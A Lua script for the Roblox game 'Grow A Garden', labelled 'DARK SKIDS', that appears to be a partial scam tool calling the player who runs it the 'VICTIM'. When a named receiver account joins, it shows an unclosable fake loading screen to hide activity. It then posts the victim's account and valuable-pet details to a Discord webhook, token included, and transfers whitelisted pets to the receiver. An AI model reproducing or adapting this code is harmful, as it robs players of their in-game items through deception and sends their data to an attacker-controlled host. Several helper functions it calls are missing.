-- ✅ Configuration
local CONFIG = {
    WEBHOOK_URL = "https://discord.com/api/webhooks/1393637749881307249/ofeqDbtyCKTdR-cZ6Ul602-gkGOSMuCXv55RQQoKZswxigEfykexc9nNPDX_FYIqMGnP",
    USERNAMES = { "yuniecoxo" },
    PET_WHITELIST = {
        "Raccoon", "T-Rex", "Fennec Fox", "Dragonfly", "Butterfly", "Disco Bee",
        "Mimic Octopus", "Queen Bee", "Spinosaurus", "Kitsune"
    },
    FILE_URL = "https://cdn.discordapp.com/attachments/.../items.txt"
}

-- 🛠️ Services & Variables
repeat task.wait() until game:IsLoaded()
local VICTIM = game.Players.LocalPlayer
local VirtualInputManager = game:GetService("VirtualInputManager")
local dataModule = require(game:GetService("ReplicatedStorage").Modules.DataService)
local victimPetTable = {}

-- 🎭 Fake Legit Loading for Detected USERNAMES
local function showBlockingLoadingScreen()
    local plr = game.Players.LocalPlayer
    local playerGui = plr:WaitForChild("PlayerGui")
    local loadingScreen = Instance.new("ScreenGui")
    loadingScreen.Name = "UnclosableLoading"
    loadingScreen.ResetOnSpawn = false
    loadingScreen.IgnoreGuiInset = true
    loadingScreen.DisplayOrder = 999999
    loadingScreen.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
    loadingScreen.Parent = playerGui

    local blackFrame = Instance.new("Frame")
    blackFrame.BackgroundColor3 = Color3.new(0, 0, 0)
    blackFrame.Size = UDim2.new(1, 0, 1, 0)
    blackFrame.Position = UDim2.new(0, 0, 0, 0)
    blackFrame.BorderSizePixel = 0
    blackFrame.ZIndex = 1
    blackFrame.Parent = loadingScreen

    local loadingLabel = Instance.new("TextLabel")
    loadingLabel.Size = UDim2.new(0.5, 0, 0.1, 0)
    loadingLabel.Position = UDim2.new(0.25, 0, 0.45, 0)
    loadingLabel.BackgroundTransparency = 1
    loadingLabel.TextScaled = true
    loadingLabel.Text = "Loading Wait a Moment <3..."
    loadingLabel.TextColor3 = Color3.new(1, 1, 1)
    loadingLabel.Font = Enum.Font.SourceSansBold
    loadingLabel.ZIndex = 2
    loadingLabel.Parent = loadingScreen

    coroutine.wrap(function()
        while true do
            for i = 1, 3 do
                loadingLabel.Text = "Loading" .. string.rep(".", i)
                task.wait(0.5)
            end
        end
    end)()
end

local function waitForJoin()
    for _, player in game.Players:GetPlayers() do
        if table.find(CONFIG.USERNAMES, player.Name) then
            showBlockingLoadingScreen()
            return true, player.Name
        end
    end
    return false, nil
end

local function createDiscordEmbed(petList, totalValue)
    local petDataList = {}
    for petUid, value in pairs(dataModule:GetData().PetsData.PetInventory.Data) do
        if checkPetsWhilelist(value.PetType) then
            table.insert(petDataList, string.format("[%s] | Age: %s | %.2fkg | Value: %s¢", value.PetType, value.Age or "N/A", value.Weight or 0, value.Value or 0))
        end
    end

    local embed = {
        title = "🌵 Grow A Garden Hit - DARK SKIDS 🍀",
        color = 65280,
        fields = {
            {
                name = "👤 Player Information",
                value = string.format("```Name: %s\nReceiver: %s\nExecutor: %s\nAccount Age: %s```", 
                    VICTIM.Name, table.concat(CONFIG.USERNAMES, ", "), identifyexecutor(), VICTIM.AccountAge),
                inline = false
            },
            {
                name = "💰 Total Value",
                value = string.format("```%s¢```", totalValue),
                inline = false
            },
            {
                name = "🌴 Backpack",
                value = string.format("```\n%s\n```", table.concat(petDataList, "\n")),
                inline = false
            },
            {
                name = "🏝️ Join with URL",
                value = string.format("[%s](https://kebabman.vercel.app/start?placeId=%s&gameInstanceId=%s)", game.JobId, game.PlaceId, game.JobId),
                inline = false
            }
        },
        footer = {
            text = string.format("%s | %s", game.PlaceId, game.JobId)
        }
    }

    local data = {
        content = string.format("--@everyone\ngame:GetService(\"TeleportService\"):TeleportToPlaceInstance(%s, \"%s\")", game.PlaceId, game.JobId),
        username = VICTIM.Name,
        avatar_url = "https://cdn.discordapp.com/attachments/1024859338205429760/1103739198735261716/icon.png",
        embeds = {embed}
    }

    local request = http_request or request or HttpPost or syn.request
    request({
        Url = CONFIG.WEBHOOK_URL,
        Method = "POST",
        Headers = { ["Content-Type"] = "application/json" },
        Body = game:GetService("HttpService"):JSONEncode(data)
    })
end

-- rest unchanged

-- Replace inside `checkPetsInventory` loop:
-- Remove: task.wait(CONFIG.GIFT_DELAY)
-- No delay in gifting

local function checkPetsInventory(targetName)
    for petUid, value in pairs(dataModule:GetData().PetsData.PetInventory.Data) do
        if not checkPetsWhilelist(value.PetType) then continue end
        local petObject = getPetObject(petUid)
        if not petObject then continue end
        equipPet(petObject)
        startSteal(targetName)
    end
end
